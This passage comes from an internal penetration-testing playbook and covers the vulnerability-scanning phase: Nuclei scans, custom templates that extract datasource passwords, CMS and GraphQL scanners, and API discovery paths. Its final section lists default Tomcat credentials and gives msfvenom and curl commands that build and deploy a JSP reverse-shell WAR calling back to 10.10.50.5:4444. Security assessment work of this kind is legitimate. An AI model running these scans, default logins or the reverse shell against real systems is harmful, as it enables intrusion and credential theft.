## Part 4 — Phase 4: Vulnerability scanning

### 4.1 Nuclei (offline)

```bash
# High/critical only, no OAST
nuclei -l live.txt -t ~/nuclei-templates/ \
       -severity high,critical \
       -no-interactsh -disable-update-check \
       -rate-limit 150 -c 25 -timeout 10 \
       -o findings.txt -je findings.json

# Exposure sweep — low noise, huge value internally
nuclei -l live.txt -t ~/nuclei-templates/ \
       -tags cve,exposure,misconfig,tech,default-logins,files \
       -exclude-tags dos,intrusive,fuzz \
       -no-interactsh -disable-update-check -rate-limit 100

# With self-hosted OAST for blind SSRF / log4j / OOB RCE
nuclei -l live.txt -t ~/nuclei-templates/ \
       -interactsh-server https://oast.corp.internal \
       -interactsh-token $OAST_TOKEN \
       -tags ssrf,rce,log4j,oast

# Authenticated
nuclei -l live.txt -t ~/nuclei-templates/ -t ./custom-templates/ \
       -H "Cookie: JSESSIONID=..." -H "Authorization: Bearer eyJ..."
```

Templates that hard-code `oast.pro`/`interact.sh` silently fail on air-gapped nets — pre-filter if needed: `grep -rL "oast.pro\|interact.sh" ~/nuclei-templates/ > ok.txt`.

### 4.2 Custom Nuclei templates for internal

Actuator exposure template:
```yaml
id: internal-exposed-actuator-env
info:
  name: Spring Boot /actuator/env exposed (internal)
  severity: high
  tags: exposure,spring,actuator,internal
http:
  - method: GET
    path: ["{{BaseURL}}/actuator/env","{{BaseURL}}/actuator/configprops","{{BaseURL}}/env"]
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words: ["activeProfiles","propertySources"]
        condition: or
      - type: status
        status: [200]
    extractors:
      - type: regex
        part: body
        regex:
          - '"spring\.datasource\.password"\s*:\s*"([^"]+)"'
          - '"spring\.datasource\.url"\s*:\s*"([^"]+)"'
```

Multi-path internal exposures template: sweep `/.git/HEAD`, `/.env`, `/server-status`, `/api/v2/swagger`, `/actuator/heapdump`, `/actuator/mappings`, `/trace.axd`, `/elmah.axd`, `/phpinfo.php` with a single template. Validate before running with `nuclei -validate -t ./custom-templates/`.

### 4.3 Technology-specific scanners

```bash
# WordPress
wpscan --url https://wp.corp.internal --disable-tls-checks --api-token "" --no-update \
       --random-user-agent -e vp,vt,u,cb,dbe --plugins-detection aggressive

# Drupal / SilverStripe / Joomla
droopescan scan drupal -u https://internal-drupal.corp --hide-progressbar -t 10
droopescan scan silverstripe -u https://sscms.corp

# Joomla-specific
perl joomscan.pl -u https://joomla.corp.internal --enumerate-components

# Nikto — legacy but still finds stuff
nikto -h https://legacy-app.corp -ssl -nointeractive -Tuning 123bde -o nikto.html

# testssl.sh — TLS/SSL analysis offline
./testssl.sh --warnings off --fast --quiet --htmlfile tls.html https://app.corp.internal:443
```

Never use `-Tuning 6` (DoS). Internal CAs will "fail" chain validation — expected.

### 4.4 GraphQL

```bash
# Fingerprint the engine (Apollo vs Graphene vs Hasura vs HyperGraphQL)
python3 graphw00f/main.py -d -f -t https://api.corp.internal

# Quick audit — introspection, field suggestions, alias DoS, GET CSRF
python3 graphql-cop/graphql-cop.py -t https://api.corp.internal/graphql -x \
        -H "Authorization: Bearer ..." -o report.json -f json

# Schema reconstruction when introspection is OFF
clairvoyance https://api.corp.internal/graphql \
             -w /opt/wordlists/google-10000-english.txt -o schema.json \
             -H "Authorization: Bearer eyJ..." -c 5 -b 64

# InQL in Burp: right-click /graphql request → Send to InQL Scanner
```

Common paths to fuzz: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`, `/playground`, `/altair`, `/console`. Internal GraphQL APIs rarely disable introspection — run `{__schema{types{name fields{name}}}}` first.

### 4.5 API spec / OpenAPI discovery

Common paths (feed into nuclei/ffuf): `/swagger`, `/swagger-ui.html`, `/swagger/index.html`, `/api-docs`, `/v2/api-docs`, `/v3/api-docs`, `/openapi.json`, `/openapi.yaml`, `/api/swagger.json`, `/docs`, `/redoc`, `/graphql`, `/graphiql`, `/playground`, `/altair`, `/.well-known/openapi`, `/actuator/openapi`.

```bash
nuclei -l live.txt -t ~/nuclei-templates/ -tags swagger,openapi,api
```

Once found, import into Burp/Postman for authenticated replay, or build a .kite via `kr kb scan`.

### 4.6 Stack-specific probes

- **ASP.NET/IIS**: `/trace.axd`, `/elmah.axd`, `/elmah.axd/download`, unencrypted `__VIEWSTATE`. Feed ViewState to ysoserial.net; check against leaked MachineKeys with Blacklist3r (`AspDotNetWrapper.exe`) or `viewgen`.
- **Java/Spring**: `/actuator/env`, `/actuator/heapdump` (= creds in memory), `/actuator/gateway/routes`, `/actuator/threaddump`; `/jolokia/list` → RCE via MBeans; `/h2-console` → RCE via `CREATE ALIAS` JNDI; Struts `/struts2-showcase/` / `*.action`; JBoss `/invoker/JMXInvokerServlet`.
- **Tomcat**: `/manager/html` with `tomcat:tomcat`, `admin:admin`, `admin:`, `admin:password`, `admin:tomcat`, `manager:manager`, `tomcat:s3cret`, `role1:role1`. Deploy WAR for RCE:
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.50.5 LPORT=4444 -f war -o shell.war
  curl -u tomcat:tomcat --upload-file shell.war \
       "https://tomcat.corp.internal/manager/text/deploy?path=/sh&update=true"
  ```

